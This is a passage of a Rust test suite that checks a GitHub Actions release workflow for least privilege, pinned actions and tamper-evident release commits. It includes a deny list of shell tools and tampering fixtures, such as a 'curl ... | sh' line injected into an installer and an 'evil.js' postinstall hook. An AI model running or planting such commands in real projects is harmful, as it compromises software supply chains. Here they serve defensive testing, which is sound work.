            let line = rest[3 + at + 1..].lines().next().unwrap_or("");
            line.len() > 2 && !line[2..].starts_with(' ') && line.ends_with(':')
        })
        .map(|(at, _)| 3 + at)
        .unwrap_or(rest.len());
    rest[..end].to_string()
}

#[test]
fn the_release_workflow_runs_on_dev_and_by_hand_only_one_run_at_a_time() {
    let rules = release_rules();
    assert!(
        rules.contains("\non:\n  push:\n    branches: [dev]\n  workflow_dispatch:\n"),
        "a push to dev, or by hand"
    );
    for never in [
        "pull_request",
        "pull_request_target",
        "workflow_run",
        "schedule:",
        "secrets.",
    ] {
        assert!(
            !rules.contains(never),
            "the release workflow has no {never}"
        );
    }
    // One run at a time across all its jobs, and a run that started is never cancelled.
    let top = &rules[..rules.find("\njobs:\n").expect("jobs")];
    assert!(
        top.contains("\npermissions: {}\n"),
        "no permission by default"
    );
    assert!(top.contains("\nconcurrency:\n  group: release\n  cancel-in-progress: false\n"));
    assert!(!rules.contains("cancel-in-progress: true"));
    // GitHub's hosted runner, always: a self-hosted one keeps its cache beside this workflow's write token.
    assert_eq!(rules.matches("runs-on: ubuntu-24.04").count(), 3);
    assert_eq!(rules.matches("runs-on:").count(), 3);
    assert!(!rules.contains("self-hosted"));
    assert!(!rules.contains("--force") && !rules.contains("push -f"));
}

#[test]
fn the_job_that_runs_the_repository_s_code_can_write_nothing() {
    let rules = release_rules();
    let cut = job(&rules, "cut");
    assert!(cut.contains("    permissions:\n      contents: read\n"));
    assert_eq!(cut.matches("permissions:").count(), 1);
    assert!(
        !cut.contains("write"),
        "the cutting job holds no write permission"
    );
    assert!(
        cut.contains("          persist-credentials: false\n"),
        "its checkout leaves no credential behind"
    );
    // Its read-only token is seen by one step, the one that lists the releases, and by none that runs a build, a test,
    // a package's install or a script that writes.
    assert_eq!(cut.matches("GH_TOKEN").count(), 1);
    let plan = cut.find("- name: What this run does").expect("the plan");
    let next = cut
        .find("- name: The Rust toolchain")
        .expect("the next step");
    let token = cut
        .find("GH_TOKEN: ${{ github.token }}")
        .expect("the token");
    assert!(plan < token && token < next);
    for never in [
        "git push",
        "gh release create",
        "gh release upload",
        "gh api",
    ] {
        assert!(!cut.contains(never), "the cutting job has no {never}");
    }
    // It is where everything of the repository runs, and the one place the files are built.
    assert_eq!(rules.matches("scripts/release.sh").count(), 1);
    assert_eq!(cut.matches("run: scripts/release.sh").count(), 1);
    assert!(!rules.contains("build-portable.sh"));
    for here in ["cargo test --workspace", "npm ci", "scripts/version.sh set"] {
        assert!(cut.contains(here));
    }
}

#[test]
fn the_jobs_that_can_write_run_nothing_of_the_repository() {
    let rules = release_rules();
    for name in ["publish", "main"] {
        let text = job(&rules, name);
        assert!(text.contains("    permissions:\n      contents: write\n"));
        assert_eq!(text.matches("permissions:").count(), 1);
        for never in [
            "cargo",
            "rustup",
            "npm",
            "npx",
            "node",
            "apt-get",
            "curl",
            "wget",
            "eval",
            "bash ",
            "sh -c",
            "make",
            "working-directory",
            "chmod",
        ] {
            assert!(
                !text.contains(never),
                "the {name} job runs nothing of the repository: no {never}"
            );
        }
    }
    // No script of the repository is named in them, but for one path in the publishing job: the installer's, held in
    // one variable. It names a file inside a commit, which git reads as data: every use of it follows the `:` of an
    // object name, or is the argument of one of the two helpers that read a file of a commit, or the last of the list
    // of files a release commit may change, or stands in the words of a refusal. No command starts with it, and no
    // command is a shell handed a file.
    assert!(!job(&rules, "main").contains("scripts/"));
    assert!(!job(&rules, "main").contains("install.sh"));
    let publish = job(&rules, "publish");
    assert_eq!(publish.matches("scripts/").count(), 1);
    assert!(publish.contains("\n          INSTALLER=\"scripts/install.sh\"\n"));
    assert!(
        !publish.contains("$INSTALLER"),
        "always written ${{INSTALLER}}"
    );
    for line in publish.lines() {
        let command = line.trim_start();
        for start in [
            "\"${INSTALLER}",
            "${INSTALLER}",
            "./",
            "\"./",
            "install.sh",
            "\"${HANDOVER}",
            "${HANDOVER}",
        ] {
            assert!(
                !command.starts_with(start),
                "no command is a file: {command}"
            );
        }
        for word in command.split_whitespace() {
            assert!(
                ![
                    "sh", "bash", "dash", "exec", "xargs", "env", "command", "nohup", "timeout"
                ]
                .contains(&word),
                "no command hands a file to a shell or to another program: {command}"
            );
        }
        // The words of a refusal are words; what is before them is the command.
        let command = command.split("stop \"").next().unwrap_or("");
        for (at, _) in command.match_indices("${INSTALLER}") {
            let before = &command[..at];
            assert!(
                before.ends_with(':')
                    || before.ends_with("changes \"")
                    || before.ends_with("where \"")
                    || before.ends_with("\\n'\""),
                "the installer's path is read with git, as data: {command}"
            );
        }
    }
    // No line reads another file as shell: `source` and `.` at the start of a command. (The word itself is in the
    // publishing job, as the name of a lock file's field.)
    for name in ["publish", "main"] {
        for line in job(&rules, name).lines() {
            let command = line.trim_start();
            assert!(
                !command.starts_with("source ") && !command.starts_with(". "),
                "the {name} job reads no file as shell: {command}"
            );
            for joined in [
                "; source ",
                "&& source ",
                "|| source ",
                "; . ",
                "&& . ",
                "|| . ",
            ] {
                assert!(!command.contains(joined), "the {name} job: {command}");
            }
        }
    }
    // The only actions beside the checkout: the one that fetches what the cutting job handed over.
    let uses: Vec<&str> = publish
        .lines()
        .filter_map(|line| line.trim_start().strip_prefix("- uses: "))
        .map(|action| action.split('@').next().unwrap_or(""))
        .collect();
    assert_eq!(uses, ["actions/checkout", "actions/download-artifact"]);
    // One atomic push carries the commit and the tag, and it is the only push of dev in the workflow.
    assert!(publish.contains(
        "git push -q --atomic origin \"${COMMIT}:refs/heads/dev\" \"refs/tags/v${VERSION}\""
    ));
    assert_eq!(rules.matches("refs/heads/dev").count(), 1);
    assert_eq!(rules.matches("gh release create").count(), 1);
    // The checksums are this job's own reading of the two files, and SHA256SUMS is compared with them byte for byte:
    // no checker's own way of reading a line decides what is published.
    assert!(
        publish.contains("written=$(cd \"${HANDOVER}\" && sha256sum -- \"${asset}\" install.sh)")
    );
    assert!(publish.contains(
        "printf '%s  %s\\n%s  install.sh\\n' \"${true_sum}\" \"${asset}\" \"${true_installer_sum}\" | git hash-object --stdin"
    ));
    assert!(!publish.contains("sha256sum --check"));
    // The installer is published as the release commit holds it, and the cutting job hands it over with the rest.
    assert!(publish.contains(
        "gh release create \"v${VERSION}\" \"arca-${VERSION}-linux-x86_64\" install.sh SHA256SUMS \"${flags[@]}\""
    ));
    assert!(publish.contains("git hash-object --no-filters \"${HANDOVER}/install.sh\""));
    assert!(job(&rules, "cut").contains(
        "cp \"dist/arca-${VERSION}-linux-x86_64\" dist/install.sh dist/SHA256SUMS dist/RELEASE-NOTES.md handover/"
    ));
    // The pushes and the publishing use the workflow's own token and no other: a push made with it starts no run, so
    // the release commit starts neither CI nor this workflow again.
    assert_eq!(rules.matches("GH_TOKEN: ${{ github.token }}").count(), 2);
    assert_eq!(rules.matches("github.token").count(), 2);
    assert!(!rules.contains("token:"), "no step is handed another token");
    assert!(!rules.contains("ssh-key"));
    // main is read by its full name: a pattern such as `main` would match another branch ending in /main.
    let main = job(&rules, "main");
    assert!(main.contains("git ls-remote --exit-code origin refs/heads/main"));
    assert!(!main.contains("--heads origin main"));
}

#[test]
fn every_action_in_the_workflows_is_named_by_its_full_commit() {
    for name in ["release.yml", "commitlint.yml"] {
        let text = workflow(name);
        let mut uses = 0;
        for line in text.lines() {
            let Some(action) = line.trim_start().strip_prefix("- uses: ") else {
                continue;
            };
            uses += 1;
            let (_, reference) = action.split_once('@').expect("an action names a reference");
            let commit = reference.split_whitespace().next().unwrap_or("");
            assert!(
                commit.len() == 40 && commit.bytes().all(|b| b.is_ascii_hexdigit()),
                "{name}: {action} is not named by a full commit"
            );
            assert!(
                reference.contains(" # v"),
                "{name}: {action} says which version the commit is"
            );
        }
        assert!(uses > 0, "{name} uses at least the checkout");
        assert!(
            !text.contains("\n        uses: "),
            "{name}: every action is on a `- uses:` line this test reads"
        );
    }
    // The commit check reads a pull request and writes nothing.
    let lint = workflow("commitlint.yml");
    assert!(lint.contains("\non:\n  pull_request:\n"));
    assert!(lint.contains("\npermissions:\n  contents: read\n"));
    assert!(lint.contains("persist-credentials: false"));
    assert!(!lint.contains("pull_request_target") && !lint.contains("write"));
}

/// Where in a workflow file an expression stands. GitHub allows each place its own contexts and refuses the whole
/// workflow for one that is not allowed there, before any job runs.
#[derive(Clone, Copy, Debug, PartialEq)]
enum Place {
    /// The workflow's own `env`.
    WorkflowEnv,
    /// The workflow's own `concurrency`, and `run-name`.
    WorkflowConcurrency,
    /// `on.workflow_call.inputs.<id>.default`.
    CallDefault,
    /// `on.workflow_call.outputs.<id>.value`.
    CallValue,
    JobIf,
    JobEnv,
    JobSecrets,
    JobOutputs,
    JobStrategy,
    /// `jobs.<id>.with`, for a job that calls a workflow.
    JobWith,
    /// `jobs.<id>.defaults.run`.
    JobDefaults,
    /// A job's `name`, `runs-on`, `concurrency`, `timeout-minutes`, `continue-on-error`, `container`, `environment`,
    /// `services`.
    JobOther,
    /// Anything of a step: `if`, `env`, `with`, `run`, `name`, `working-directory`, `timeout-minutes`.
    Step,
}

impl Place {
    /// GitHub's table of the contexts each place may read ("Context availability" in the documentation of contexts).
    fn allows(self) -> &'static [&'static str] {
        match self {
            Place::WorkflowEnv => &["github", "secrets", "inputs", "vars"],
            Place::WorkflowConcurrency | Place::CallDefault => &["github", "inputs", "vars"],
            Place::CallValue => &["github", "jobs", "vars", "inputs"],
            Place::JobIf | Place::JobStrategy => &["github", "needs", "vars", "inputs"],
            Place::JobEnv | Place::JobSecrets => &[
                "github", "needs", "strategy", "matrix", "vars", "secrets", "inputs",
            ],
            Place::JobWith | Place::JobOther => {
                &["github", "needs", "strategy", "matrix", "vars", "inputs"]
            }
            Place::JobDefaults => &[
                "github", "needs", "strategy", "matrix", "env", "vars", "inputs",
            ],
            Place::JobOutputs | Place::Step => &[
                "github", "needs", "strategy", "matrix", "job", "runner", "env", "vars", "secrets",
                "steps", "inputs",
            ],
        }
    }
}

/// The place a line stands in, from the keys above it, outermost first. `None` is a place that takes no expression.
fn place_of(path: &[&str]) -> Option<Place> {
    match path {
        ["env", ..] => Some(Place::WorkflowEnv),
        ["concurrency", ..] | ["run-name"] => Some(Place::WorkflowConcurrency),
        ["on", "workflow_call", "inputs", ..] => Some(Place::CallDefault),
        ["on", "workflow_call", "outputs", ..] => Some(Place::CallValue),
        ["jobs", _, "steps", ..] => Some(Place::Step),
        ["jobs", _, "if"] => Some(Place::JobIf),
        ["jobs", _, "env", ..] => Some(Place::JobEnv),
        ["jobs", _, "secrets", ..] => Some(Place::JobSecrets),
        ["jobs", _, "outputs", ..] => Some(Place::JobOutputs),
        ["jobs", _, "strategy", ..] => Some(Place::JobStrategy),
        ["jobs", _, "with", ..] => Some(Place::JobWith),
        ["jobs", _, "defaults", ..] => Some(Place::JobDefaults),
        [
            "jobs",
            _,
            "name" | "runs-on" | "concurrency" | "timeout-minutes" | "continue-on-error"
            | "container" | "environment" | "services",
            ..,
        ] => Some(Place::JobOther),
        _ => None,
    }
}

/// The contexts an expression reads: each name that is followed by `.` or `[` and is not inside a quoted string or
/// part of a longer name. A function is followed by `(` and is not one.
fn contexts(expression: &str) -> Vec<String> {
    let bytes = expression.as_bytes();
    let mut found = Vec::new();
    let mut at = 0;
    let mut after_dot = false;
    while at < bytes.len() {
        let c = bytes[at];
        if c == b'\'' {
            at += 1;
            while at < bytes.len() && bytes[at] != b'\'' {
                at += 1;
            }
            at += 1;
            after_dot = false;
        } else if c.is_ascii_alphabetic() || c == b'_' {
            let start = at;
            while at < bytes.len()
                && (bytes[at].is_ascii_alphanumeric() || bytes[at] == b'_' || bytes[at] == b'-')
            {
                at += 1;
            }
            let next = bytes.get(at).copied();
            if !after_dot && (next == Some(b'.') || next == Some(b'[')) {
                found.push(expression[start..at].to_string());
            }
            after_dot = false;
        } else {
            after_dot = c == b'.';
            at += 1;
        }
    }
    found
}

/// Every expression of a workflow file with the place it stands in and the line it is on: each `${{ ... }}`, and the
/// whole value of each `if:`, which is an expression with or without the braces. The file is read by its indentation,
/// which is how these workflows are written: block mappings, and `- ` for a step.
fn expressions(text: &str) -> Vec<(usize, Vec<String>, String)> {
    let mut path: Vec<(usize, String)> = Vec::new();
    let mut found = Vec::new();
    // A block scalar (`run: |`) holds text, not keys: its lines stay in the place of the key that opened it.
    let mut block: Option<usize> = None;
    for (number, raw) in text.lines().enumerate() {
        let trimmed = raw.trim_start();
        if trimmed.is_empty() || trimmed.starts_with('#') {
            continue;
        }
        let mut indent = raw.len() - trimmed.len();
        if let Some(opened) = block {
            if indent > opened {
                for inner in raw.match_indices("${{") {
                    let rest = &raw[inner.0 + 3..];
                    let end = rest.find("}}").unwrap_or(rest.len());
                    let keys = path.iter().map(|(_, key)| key.clone()).collect();
                    found.push((number + 1, keys, rest[..end].to_string()));
                }
                continue;
            }
            block = None;
        }
        let mut line = trimmed;
        while let Some(item) = line.strip_prefix("- ") {
            indent += 2;
            line = item;
        }
        let Some((key, value)) = line.split_once(':') else {
            continue;
        };
        let key = key.trim().trim_matches('\'').trim_matches('"');
        while path.last().is_some_and(|(at, _)| *at >= indent) {
            path.pop();
        }
        path.push((indent, key.to_string()));
        let value = value.trim();
        if value == "|" || value == ">" || value == "|-" || value == ">-" {
            block = Some(indent);
            continue;
        }
        let keys: Vec<String> = path.iter().map(|(_, key)| key.clone()).collect();
        if key == "if" && !value.is_empty() {
            let bare = value.trim_start_matches("${{").trim_end_matches("}}");
            found.push((number + 1, keys, bare.to_string()));
            continue;
        }
        for inner in value.match_indices("${{") {
            let rest = &value[inner.0 + 3..];
            let end = rest.find("}}").unwrap_or(rest.len());
            found.push((number + 1, keys.clone(), rest[..end].to_string()));
        }
    }
    found
}

/// Every context a workflow file reads in a place that does not allow it, as "<line>: <context> in <place>".
fn misplaced(text: &str) -> Vec<String> {
    let mut wrong = Vec::new();
    for (line, keys, expression) in expressions(text) {
        let path: Vec<&str> = keys.iter().map(String::as_str).collect();
        // A step's own `if` is a step's place; a job's `if` is the job's.
        let Some(place) = place_of(&path) else {
            wrong.push(format!(
                "{line}: an expression where none is expected ({})",
                path.join(".")
            ));
            continue;
        };
        for context in contexts(&expression) {
            if !place.allows().contains(&context.as_str()) {
                wrong.push(format!("{line}: {context} in {place:?}"));
            }
        }
    }
    wrong
}

#[test]
fn every_expression_reads_only_the_contexts_its_place_allows() {
    // The reader finds what it must: a context GitHub refuses in a job's env, in a job's if and in the workflow's
    // env, and none where the same context is allowed. `runner` in a job's env is the mistake this test is for:
    // GitHub answers "Unrecognized named-value: runner" and runs nothing.
    let sample = "\
name: Sample
on:
  push:
env:
  A: ${{ github.sha }}
  B: ${{ runner.temp }}
concurrency:
  group: x-${{ github.ref }}-${{ matrix.os }}
jobs:
  one:
    if: needs.zero.outputs.go == 'true' && steps.plan.outputs.mode != 'runner.temp'
    runs-on: ${{ matrix.os }}
    env:
      C: ${{ needs.zero.outputs.version || inputs.version }}
      D: ${{ runner.temp }}/release
      E: ${{ format('{0}', env.A) }}
    outputs:
      v: ${{ steps.plan.outputs.version }}
    steps:
      - uses: actions/checkout@0000000000000000000000000000000000000000 # v1
        if: runner.os == 'Linux' && steps.plan.outputs.mode != 'none'
        with:
          path: ${{ runner.temp }}/x
      - name: Run
        env:
          F: ${{ runner.temp }}
        run: |
          echo ${{ runner.arch }} \"${{ secrets.X }}\"
";
    assert_eq!(
        misplaced(sample),
        [
            "6: runner in WorkflowEnv",
            "8: matrix in WorkflowConcurrency",
            "11: steps in JobIf",
            "15: runner in JobEnv",
            "16: env in JobEnv",
        ]
    );
    assert_eq!(
        contexts(
            "fromJSON(needs.a.outputs.b)[0] == github.event.x['y.z'] && always() && !cancelled()"
        ),
        ["needs", "github"]
    );

    for name in ["release.yml", "commitlint.yml"] {
        let text = workflow(name);
        assert!(
            !expressions(&text).is_empty(),
            "{name} has expressions, and the reader finds them"
        );
        assert_eq!(
            misplaced(&text),
            Vec::<String>::new(),
            "{name}: a context in a place GitHub does not allow it"
        );
    }
    // The publishing job finds what was handed over from the runner's own variable, inside its scripts: the `runner`
    // context is not allowed in a job's env.
    let rules = release_rules();
    let publish = job(&rules, "publish");
    assert!(!publish.contains("HANDOVER: ${{"));
    assert!(publish.contains("HANDOVER=\"${RUNNER_TEMP}/release\""));
    assert!(publish.contains("          path: ${{ runner.temp }}/release\n"));
}

/// The script of one named step of the release workflow, exactly as the workflow has it.
fn step_script(name: &str) -> String {
    let text = workflow("release.yml");
    let mut lines = text
        .lines()
        .skip_while(|line| *line != format!("      - name: {name}"));
    assert!(
        lines.next().is_some(),
        "the workflow has a step named {name}"
    );
    let mut script = String::new();
    let mut inside = false;
    for line in lines {
        if inside {
            if !line.is_empty() && !line.starts_with("          ") {
                break;
            }
            script.push_str(line.strip_prefix("          ").unwrap_or(""));
            script.push('\n');
        } else if line == "        run: |" {
            inside = true;
        } else if line.starts_with("      - ") {
            break;
        }
    }
    assert!(inside, "the step {name} has a script");
    script
}

/// A stand-in for the two machines of a release: a bare repository as the remote, clones of it for the jobs, a
/// directory standing in for the publishing job's temporary directory, and a directory whose `gh` answers
/// `release list` from `releases.txt` and writes each `release create` to `created.log`.
struct Lab {
    scratch: Scratch,
}

/// What one step did: its exit code, what it printed, and the outputs it set.
struct Ran {
    code: Option<i32>,
    said: String,
    outputs: BTreeMap<String, String>,
}

const GH_STUB: &str = r#"#!/usr/bin/env bash
# A stand-in for gh. It never touches the network.
set -euo pipefail
dir="$(dirname "$0")"
if [ "$1 $2" = "release list" ]; then
    fields=""; expr=""
    while [ "$#" -gt 0 ]; do
        case "$1" in
            --json) fields="$2"; shift ;;
            --jq) expr="$2"; shift ;;
        esac
        shift
    done
    [ "$fields" = "tagName,isDraft" ] || { echo "gh stub: asked for $fields" >&2; exit 1; }
    # releases.txt: one "<tag> <published|draft>" per line. The workflow's own filter runs on it.
    awk 'BEGIN { printf "[" }
         { printf "%s{\"tagName\":\"%s\",\"isDraft\":%s}", (NR > 1 ? "," : ""), $1, ($2 == "draft" ? "true" : "false") }
         END { print "]" }' "$dir/releases.txt" | jq -r "$expr"
elif [ "$1 $2" = "release create" ]; then
    printf '%s\n' "$*" >> "$dir/created.log"
else
    echo "gh stub: unexpected: $*" >&2
    exit 1
fi
"#;

/// The files of the stand-in repository that state its version, in the shapes the real ones have: a workspace manifest,
/// a lock with one workspace crate and one dependency that happens to carry the same number, and the canvas package's
/// manifest and lock, and an installer that names the release it installs.
const SEED: [(&str, &str); 8] = [
    (
        "Cargo.toml",
        "[workspace]\nmembers = [\"crates/*\"]\n\n[workspace.package]\nversion = \"0.1.0-alpha.7\"\nedition = \"2024\"\n\n[workspace.dependencies]\ndep = \"=0.1.0-alpha.7\"\n",
    ),
    (
        "Cargo.lock",
        "# This file is automatically @generated by Cargo.\nversion = 4\n\n[[package]]\nname = \"a\"\nversion = \"0.1.0-alpha.7\"\ndependencies = [\n \"dep\",\n]\n\n[[package]]\nname = \"dep\"\nversion = \"0.1.0-alpha.7\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\nchecksum = \"00\"\n",
    ),
    (
        "crates/a/Cargo.toml",
        "[package]\nname = \"a\"\nversion.workspace = true\n",
    ),
    ("crates/a/src/lib.rs", "// a\n"),
    (
        "packages/arca-canvas-dsh/package.json",
        "{\n  \"name\": \"arca-canvas-dsh\",\n  \"version\": \"0.1.0-alpha.7\",\n  \"scripts\": {\n    \"test\": \"node --test\"\n  }\n}\n",
    ),
    (
        "packages/arca-canvas-dsh/package-lock.json",
        "{\n  \"name\": \"arca-canvas-dsh\",\n  \"version\": \"0.1.0-alpha.7\",\n  \"lockfileVersion\": 3,\n  \"packages\": {\n    \"\": {\n      \"name\": \"arca-canvas-dsh\",\n      \"version\": \"0.1.0-alpha.7\",\n      \"license\": \"Apache-2.0\"\n    },\n    \"node_modules/x\": {\n      \"version\": \"0.1.0-alpha.7\",\n      \"resolved\": \"https://registry.npmjs.org/x/-/x-1.0.0.tgz\",\n      \"integrity\": \"sha512-aaaa\"\n    }\n  }\n}\n",
    ),
    (
        "CHANGELOG.md",
        "# Changelog\n\n## Unreleased\n\n<!-- Write here.\nThe release puts its heading above it. -->\n\n## 0.1.0-alpha.7\n\nThe first one.\n",
    ),
    (
        "scripts/install.sh",
        "#!/bin/sh\n# Installs the release named below.\nset -eu\n\nARCA_VERSION=0.1.0-alpha.7\n\necho \"installing $ARCA_VERSION\"\n",
    ),
];

fn put(dir: &Path, path: &str, content: &str) {
    let file = dir.join(path);
    fs::create_dir_all(file.parent().expect("a parent")).expect("a directory");
    fs::write(file, content).expect("write");
}

/// Rewrites one file of a checkout: the first `from` becomes `to`. The text must be there.
fn rewrite(dir: &Path, path: &str, from: &str, to: &str) {
    let text = fs::read_to_string(dir.join(path)).expect("read");
    assert!(text.contains(from), "{path} holds {from:?}");
    fs::write(dir.join(path), text.replacen(from, to, 1)).expect("write");
}

impl Lab {
    /// A remote whose dev holds the version script and the files that state the version, tagged as the last release
    /// of the old numbering, which is published.
    fn new(tag: &str) -> Lab {
        let scratch = Scratch::new(tag);
        let lab = Lab { scratch };
        let dir = &lab.scratch.0;
        fs::create_dir_all(dir.join("bin")).expect("the stub directory");
        fs::write(dir.join("bin/gh"), GH_STUB).expect("write the stub");
        fs::set_permissions(dir.join("bin/gh"), fs::Permissions::from_mode(0o755)).expect("mode");
        lab.releases("v0.1.0-alpha.7 published\n");
        git_at(dir, &["init", "-q", "--bare", "-b", "dev", "origin.git"]);
        let seed = lab.clone_as("seed");
        let script =
            fs::read_to_string(Path::new(REPO).join("scripts/version.sh")).expect("the script");
        put(&seed, "scripts/version.sh", &script);
        fs::set_permissions(
            seed.join("scripts/version.sh"),
            fs::Permissions::from_mode(0o755),
        )
        .expect("mode");
        for (path, content) in SEED {
            put(&seed, path, content);
        }
        git_at(&seed, &["checkout", "-q", "-B", "dev"]);
        git_at(&seed, &["add", "-A"]);
        git_at(&seed, &["commit", "-q", "-m", "feat(a): a start"]);
        git_at(&seed, &["tag", "v0.1.0-alpha.7"]);
        git_at(&seed, &["push", "-q", "origin", "dev", "v0.1.0-alpha.7"]);
        lab
    }

    fn dir(&self) -> &Path {
        &self.scratch.0
    }

    /// The publishing job's temporary directory; what was handed over is in its `release`.
    fn temp(&self) -> PathBuf {
        self.dir().join("temp")
    }

    fn handed(&self) -> PathBuf {
        self.temp().join("release")
    }

    fn releases(&self, lines: &str) {
        fs::write(self.dir().join("bin/releases.txt"), lines).expect("write the releases");
    }

    fn created(&self) -> String {
        fs::read_to_string(self.dir().join("bin/created.log")).unwrap_or_default()
    }

    /// A new checkout of the remote's dev, with every tag, as a job starts with.
    fn clone_as(&self, name: &str) -> PathBuf {
        let dir = self.dir().join(name);
        let _ = fs::remove_dir_all(&dir);
        git_at(self.dir(), &["clone", "-q", "origin.git", name]);
        dir
    }

    fn remote(&self, args: &[&str]) -> String {
        git_at(&self.dir().join("origin.git"), args)
    }

    fn remote_has_tag(&self, tag: &str) -> bool {
        git_out(
            &self.dir().join("origin.git"),
            &["rev-parse", "-q", "--verify", &format!("refs/tags/{tag}")],
        )
        .status
        .success()
    }

    /// Another push lands on the remote's dev.
    fn someone_pushes(&self, path: &str, subject: &str) {
        let other = self.clone_as("other");
        put(&other, path, &format!("{subject}\n"));
        git_at(&other, &["add", "-A"]);
        git_at(&other, &["commit", "-q", "-m", subject]);
        git_at(&other, &["push", "-q", "origin", "dev"]);
    }

    /// The repository's own script, in a checkout.
    fn version_sh(&self, checkout: &Path, args: &[&str]) {
        let out = Command::new("bash")
            .arg(checkout.join("scripts/version.sh"))
            .args(args)
            .env("GIT_CONFIG_GLOBAL", "/dev/null")
            .env("GIT_CONFIG_SYSTEM", "/dev/null")
            .env_remove("ARCA_VERSION_ROOT")
            .output()
            .expect("run scripts/version.sh");
        assert!(
            out.status.success(),
            "version.sh {args:?}: {}",
            String::from_utf8_lossy(&out.stderr)
        );
    }

    /// Someone lands a change on the remote's dev: `change` edits a checkout of it.
    fn dev_changes(&self, subject: &str, change: impl FnOnce(&Path)) {
        let other = self.clone_as("other");
        change(&other);
        git_at(&other, &["add", "-A"]);
        git_at(&other, &["commit", "-q", "-m", subject]);
        git_at(&other, &["push", "-q", "origin", "dev"]);
    }

    /// The cutting job, for `version`, cut from the remote's dev as it is now. The version and the changelog section
    /// are written by the repository's own script, the commit and the tag are made as the workflow makes them, and the
    /// bundle and the files are handed over by the workflow's own "Hand over" step. `twist` names one thing done
    /// wrong, and nothing else is: every other part is exactly a release.
    fn hand_over(&self, version: &str, twist: &str) {
        self.hand_over_written(version, twist, |cut| {
            self.version_sh(cut, &["set", version]);
            self.version_sh(cut, &["changelog", version, "2026-11-12"]);
        });
    }

    /// The same, with the version and the changelog written by `write` instead of the repository's script: for a dev
    /// whose own files the script would refuse.
    fn hand_over_written(&self, version: &str, twist: &str, write: impl FnOnce(&Path)) {
        let cut = self.clone_as("cut");
        let tag = format!("v{version}");
        if twist == "an extra commit" {
            // A commit that only adds a blank line to a file a release commit may touch: nothing but the count of
            // commits is wrong.
            rewrite(&cut, "CHANGELOG.md", "## Unreleased\n", "## Unreleased\n\n");
            git_at(&cut, &["commit", "-q", "-am", "docs: slipped in"]);
        }
        write(&cut);
        let heading = format!("## {version} (2026-11-12)\n");
        let section = format!("{heading}\n- No change is listed for this release.\n\n");
        match twist {
            "a patch entry" => rewrite(
                &cut,
                "Cargo.toml",
                "[workspace.dependencies]\n",
                "[patch.crates-io]\ndep = { git = \"https://example.com/dep\" }\n\n[workspace.dependencies]\n",
            ),
            "a pin moved" => rewrite(
                &cut,
                "Cargo.toml",
                "dep = \"=0.1.0-alpha.7\"",
                "dep = \"=0.1.0-alpha.8\"",
            ),
            "another number in the manifest" => rewrite(
                &cut,
                "Cargo.toml",
                &format!("version = \"{version}\""),
                "version = \"0.9.9\"",
            ),
            "a dependency repointed" => {
                rewrite(&cut, "Cargo.lock", "checksum = \"00\"", "checksum = \"ff\"")
            }
            "a dependency's version" => rewrite(
                &cut,
                "Cargo.lock",
                "name = \"dep\"\nversion = \"0.1.0-alpha.7\"",
                &format!("name = \"dep\"\nversion = \"{version}\""),
            ),
            "a crate at another number" => rewrite(
                &cut,
                "Cargo.lock",
                &format!("name = \"a\"\nversion = \"{version}\""),
                "name = \"a\"\nversion = \"0.9.9\"",
            ),
            "a script changed" => rewrite(
                &cut,
                "packages/arca-canvas-dsh/package.json",
                "\"test\": \"node --test\"",
                "\"test\": \"node --test\",\n    \"postinstall\": \"node evil.js\"",
            ),
            "an integrity changed" => rewrite(
                &cut,
                "packages/arca-canvas-dsh/package-lock.json",
                "sha512-aaaa",
                "sha512-bbbb",
            ),
            "a resolved address changed" => rewrite(
                &cut,
                "packages/arca-canvas-dsh/package-lock.json",
                "https://registry.npmjs.org/x/-/x-1.0.0.tgz",
                "https://example.com/x-1.0.0.tgz",
            ),
            "a dependency's lock version" => rewrite(
                &cut,
                "packages/arca-canvas-dsh/package-lock.json",
                "\"node_modules/x\": {\n      \"version\": \"0.1.0-alpha.7\"",
                &format!("\"node_modules/x\": {{\n      \"version\": \"{version}\""),
            ),
            "a changelog line removed" => rewrite(&cut, "CHANGELOG.md", "The first one.\n", ""),
            "a changelog line changed" => rewrite(
                &cut,
                "CHANGELOG.md",
                "The first one.",
                "The first and best one.",
            ),
            "a changelog line below" => rewrite(
                &cut,
                "CHANGELOG.md",
                "The first one.\n",
                "The first one.\nAnd more.\n",
            ),
            "a changelog line above" => rewrite(
                &cut,
                "CHANGELOG.md",
                "## Unreleased\n",
                "## Unreleased\nSlipped in above.\n",
            ),
            "a second heading" => rewrite(
                &cut,
                "CHANGELOG.md",
                &heading,
                &format!("{heading}\n# Another title\n"),
            ),
            "an indented heading" => rewrite(
                &cut,
                "CHANGELOG.md",
                &heading,
                &format!("{heading}\n ## 0.7.9 (2026-01-01)\n"),
            ),
            "an underlined heading" => rewrite(
                &cut,
                "CHANGELOG.md",
                &heading,
                &format!("{heading}\nA title\n---\n"),
            ),
            "a paragraph" => rewrite(
                &cut,
                "CHANGELOG.md",
                &heading,
                &format!("{heading}\nRead https://example.com first.\n"),
            ),
            "a carriage return in a line" => rewrite(
                &cut,
                "CHANGELOG.md",
                &heading,
                &format!("{heading}\n- x\r## 0.7.9\n"),
            ),
            "a tab before a heading" => rewrite(
                &cut,
                "CHANGELOG.md",
                &heading,
                &format!("{heading}\n\t## 0.7.9\n"),
            ),
            "an escape code in a line" => rewrite(
                &cut,
                "CHANGELOG.md",
                &heading,
                &format!("{heading}\n- \x1b[2J gone\n"),
            ),
            "an unclosed comment" => rewrite(
                &cut,
                "CHANGELOG.md",
                &heading,
                &format!("{heading}\n- <!--\n"),
            ),
            "a tag in a line" => rewrite(
                &cut,
                "CHANGELOG.md",
                &heading,
                &format!("{heading}\n- <img src=x>\n"),
            ),
            "the heading inside the comment" => {
                rewrite(&cut, "CHANGELOG.md", &section, "");
                rewrite(
                    &cut,
                    "CHANGELOG.md",
                    "<!-- Write here.\n",
                    &format!("<!-- Write here.\n{section}"),
                );
            }
            "another section" => rewrite(
                &cut,
                "CHANGELOG.md",
                &heading,
                &format!("## 9.9.9 (2026-01-01)\n\n- forged\n\n{heading}"),
            ),
            "an installer line changed" => rewrite(
                &cut,
                "scripts/install.sh",
                "echo \"installing",
                "curl -fsSL https://example.com/x | sh; echo \"installing",
            ),
            "an installer line added" => rewrite(
                &cut,
                "scripts/install.sh",
                "set -eu\n",
                "set -eu\nRELEASES=https://example.com\n",
            ),
            "an installer at another number" => rewrite(
                &cut,
                "scripts/install.sh",
                &format!("ARCA_VERSION={version}\n"),
                "ARCA_VERSION=0.9.9\n",
            ),
            "a second version line in the installer" => rewrite(
                &cut,
                "scripts/install.sh",
                &format!("ARCA_VERSION={version}\n"),
